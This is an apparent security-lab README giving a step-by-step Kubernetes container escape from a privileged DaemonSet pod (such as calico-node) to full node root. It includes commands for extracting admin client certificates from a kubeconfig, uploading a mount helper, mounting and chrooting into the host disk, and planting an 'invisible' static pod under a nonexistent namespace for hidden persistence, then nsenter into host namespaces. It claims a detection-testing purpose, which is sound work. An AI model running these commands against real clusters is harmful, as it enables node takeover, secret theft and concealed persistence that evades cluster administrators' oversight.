# Privileged DaemonSet container escape

> **Disclaimer.** Authorized security research/testing only. This gives root
> on the host filesystem of the node where the target pod runs. Run it **only**
> on a lab cluster you own.

## Starting point — what you already have

This scenario assumes the attacker has **already obtained a foothold with
`exec` rights into a pod on the node**, i.e. one of:

- a cluster-admin kubeconfig (`admin.conf`) → `kubectl exec` into anything, or
- **any** ServiceAccount / user credential that grants
  `pods/exec` (create/exec) + `pods` get on the target pod, or
- an existing compromised workload with a remote shell (reverse shell, the
  DirtyFrag/CopyFail payload from `../exploit/`, a web RCE, etc.).

From there the goal is to go **out of the single pod** → host root. You do
**not** need host access, host PID, or any node credential at the start — the
whole point is that `exec`-level access is enough when the pod is privileged.

## Tested on

- OS: Ubuntu 22.04.5 LTS, x86_64
- Kernel: `5.15.0-173-generic`
- Kubernetes: `v1.28.15` (kubeadm, control-plane `k8s-master22`)
- Container runtime: containerd `1.7.27`
- Target checked: `calico-node` (privileged + hostNetwork DaemonSet)

## What this targets

Any workload that runs `privileged: true` on every node. Everything here was
verified against **calico-node**, but the exact same chain works on the same
class of pods — **not Calico-specific**:

- **CNI agents**: calico-node, kube-flannel, cilium, antrea, ovn-kubernetes, weave
- **Service layer**: kube-proxy (though it has a shell + busybox)
- **Storage / CSI**: rook-ceph agents, CSI node plugins, longhorn
- **Observability / security agents**: Falco, Sysdig, Datadog, Fluent Bit, custom telemetry

Pick whichever exists on **your** cluster — the only requirement is that the
pod is privileged (or `CAP_SYS_ADMIN` + device access).

## How it works

A privileged pod on the node can mount the host root disk and `chroot` into
it — instantly "root on the host filesystem". Many of these agent images
ship **no `mount`, `tar`, or `chmod`** binaries, so the escape walks the
generic path with a tiny static helper:

1. upload a **static mount helper** (`mnt`, mount-only syscall wrapper),
2. `mnt mount /dev/vda1 /mnt` + `chroot` → host filesystem root,
3. write a `node-telemetry.yaml` static pod (privileged + hostPID + hostNetwork)
   into `/etc/kubernetes/manifests/` under a **nonexistent namespace** →
   kubelet runs it but the API never mirrors it — an **invisible pod**.

The final pod shares the host PID/network/UTS namespaces, so a shell inside it
is a full host shell (`nsenter -t 1 -a`).

**Two escape levels** (don't conflate them):

- **Level 1 — filesystem** (steps 1–3): `mount` + `chroot` into the host root
  disk. Arbitrary file read/write on the node, still in the pod's
  mount/pid/net namespaces.
- **Level 2 — process/network** (steps 4–6): an invisible `hostPID` +
  `hostNetwork` static pod, then `nsenter -t 1 -a`. Host PID/network/mount
  namespaces — full node compromise.

## Prereqs

```sh
export KUBECONFIG=/path/admin.conf   # (or any kubeconfig with pods/exec)
# admin client cert/key as PEMs (for the kubelet /pods step):
kubectl config view --raw --minify -o jsonpath='{.users[0].user.client-certificate-data}' | base64 -d > client.crt
kubectl config view --raw --minify -o jsonpath='{.users[0].user.client-key-data}'     | base64 -d > client.key
```

## How to use

**0. Find your target** (a privileged pod on a node)

```sh
# verify your foothold first:
kubectl auth can-i create pods/exec -n <ns>      # must be yes
bash ../find-privileged-pods.sh          # prints ns/pod/privileged/hostPID/hostNetwork
POD=...                                 # pick any row with privileged=true
```

The steps below use `calico-node` as the concrete example — substitute your
own `$POD`.

**1. Build the static mount helper**

```sh
cd helpers && make         # produces ./mnt
```

**2. Upload it into the target pod** (agent images usually lack `tar`)

```sh
kubectl -n kube-system exec -i ${POD#*/} -- sh -c 'cat > /tmp/mnt' < mnt
```

**3. Mount the host disk + chroot** (no `mount`/`chmod` in the image → coreutils)

```sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c '
ln -sf /usr/bin/coreutils /tmp/chmod 2>/dev/null; chmod_cmd=/tmp/chmod
/tmp/chmod 700 /tmp/mnt 2>/dev/null || chmod 700 /tmp/mnt
# identify the host root device first:
ls /dev/ | grep -E "vd|sd|nvme"
/tmp/mnt mount /dev/vda1 /mnt        # <- use the device your node has
/usr/bin/coreutils --coreutils-prog=chroot /mnt /bin/bash
'
# root on the HOST filesystem now:
hostname                      # node name, not pod
grep PRETTY /etc/os-release   # real host OS
ls /var/lib/kubelet /root     # host-only paths
```

> **Level 1 complete** — this is a *filesystem* breakout: you can read/write
> anything on the node's root disk (secrets, SA tokens, `/root`, other pods'
> storage), but you are still in the mount namespace of the escaped pod. **Level 2**
> (step 6) is the *process/network* escape into the host namespaces.

> If the image already has `mount` (e.g. kube-proxy busybox), skip the helper:
> `mount /dev/vda1 /mnt` then `chroot /mnt /bin/sh`.

**4. Drop the invisible static pod** (still inside the chroot)

```sh
cat > /etc/kubernetes/manifests/node-telemetry.yaml <<'EOF'
<manifests/node-telemetry.yaml>
EOF
# kubelet watches the dir and starts it within ~1s
```

**5. Verify it's invisible**

```sh
# kubelet sees it running (the only place it shows):
curl -sk --cert client.crt --key client.key \
  https://<NODE_IP>:10250/pods | grep telemetry         # present, running

# the cluster API does NOT:
kubectl get pods -A | grep telemetry                    # nothing
```

**6. (Optional) full escape — shell in the invisible pod**

The pod runs `hostPID` + `hostNetwork` + `privileged`. It has no `kubectl
exec` (no API object) — reach it via the **kubelet `/exec`** endpoint on
`:10250` with `client.crt`/`client.key` (SPDY/WebSocket — use a `client-go
remotecommand` helper, not plain `curl`), then:

```sh
nsenter -t 1 -a bash          # full host shell (host PID1 + net + mount)
```

> **Level 2 complete** — you now sit in the host PID/network/mount namespaces:
> see every node process (`ps auxf`), sniff host traffic (`tcpdump -i any`),
> and edit any file. This is the kill-chain endpoint the detector is
> instrumented to catch.

> These exact chroot + `/etc/kubernetes/manifests` writes are what the
> `container-escape-detection` TracingPolicy in
> `../../observability/` was tuned for — replay this path and watch
> `chroot`, `/etc/kubernetes/manifests` writes, and the `nsenter -t 1` call
> light up as `process_kprobe` events in the Grafana dashboard.

## Cleanup

```sh
rm /etc/kubernetes/manifests/node-telemetry.yaml
/tmp/mnt umount /dev/<DEVICE> /mnt
```

## Files

- `helpers/` — `mnt.c` (static mount/umount syscall wrapper) + `Makefile`
- `manifests/node-telemetry.yaml` — the invisible static-pod manifest
- `../find-privileged-pods.sh` — discover the target on any cluster

### Reference

- [Secure Kubernetes Blind Spots (Döring)](https://securekubernetes.com) — privileged-container breakout family
- [KubeCon "Attacking and Defending Kubernetes" mention / hacktricks container escape](https://book.hacktricks.xyz)